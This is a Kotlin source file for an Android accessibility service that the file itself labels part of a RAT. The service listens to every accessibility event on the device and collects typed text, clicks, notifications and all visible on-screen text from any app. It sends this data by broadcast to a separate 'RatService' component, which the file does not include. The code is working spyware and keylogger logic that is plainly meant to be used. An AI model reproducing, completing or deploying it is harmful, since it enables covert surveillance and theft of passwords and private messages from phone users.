package com.example.kagenezumi

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.AccessibilityServiceInfo
import android.content.Intent
import android.util.Log
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import org.json.JSONObject

class AccessibilityService : AccessibilityService() {
    companion object {
        private const val TAG = "RatAccessibilityService"
        const val ACTION_ACCESSIBILITY_EVENT = "com.example.kagenezumi.ACTION_ACCESSIBILITY_EVENT"
        const val EXTRA_EVENT_DATA = "event_data"
    }

    override fun onServiceConnected() {
        val info = AccessibilityServiceInfo().apply {
            eventTypes = AccessibilityEvent.TYPES_ALL_MASK
            feedbackType = AccessibilityServiceInfo.FEEDBACK_ALL_MASK
            flags = AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS or
                    AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS or
                    AccessibilityServiceInfo.FLAG_REQUEST_FILTER_KEY_EVENTS
            notificationTimeout = 0
        }
        serviceInfo = info
        Log.i(TAG, "Accessibility Service Connected")
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent) {
        try {
            val eventData = JSONObject().apply {
                put("type", getEventTypeString(event.eventType))
                put("package", event.packageName?.toString() ?: "unknown")
                put("text", event.text.joinToString(", "))
                put("time", event.eventTime)
                
                // Get text from focused node
                val source = event.source
                if (source != null) {
                    put("nodeText", getNodeText(source))
                    source.recycle()
                }
            }

            // Send event to RatService
            val intent = Intent(ACTION_ACCESSIBILITY_EVENT).apply {
                putExtra(EXTRA_EVENT_DATA, eventData.toString())
            }
            sendBroadcast(intent)

            Log.d(TAG, "Event sent: $eventData")
        } catch (e: Exception) {
            Log.e(TAG, "Error processing accessibility event", e)
        }
    }

    private fun getEventTypeString(eventType: Int): String {
        return when (eventType) {
            AccessibilityEvent.TYPE_VIEW_CLICKED -> "CLICK"
            AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> "TEXT_CHANGED"
            AccessibilityEvent.TYPE_VIEW_FOCUSED -> "FOCUS"
            AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED -> "WINDOW_CHANGE"
            AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED -> "NOTIFICATION"
            else -> "OTHER"
        }
    }

    private fun getNodeText(node: AccessibilityNodeInfo): String {
        val text = StringBuilder()
        try {
            if (node.text != null) {
                text.append(node.text)
            }
            
            for (i in 0 until node.childCount) {
                val child = node.getChild(i)
                if (child != null) {
                    text.append(" ").append(getNodeText(child))
                    child.recycle()
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error getting node text", e)
        }
        return text.toString()
    }

    override fun onInterrupt() {
        Log.w(TAG, "Accessibility Service Interrupted")
    }
} 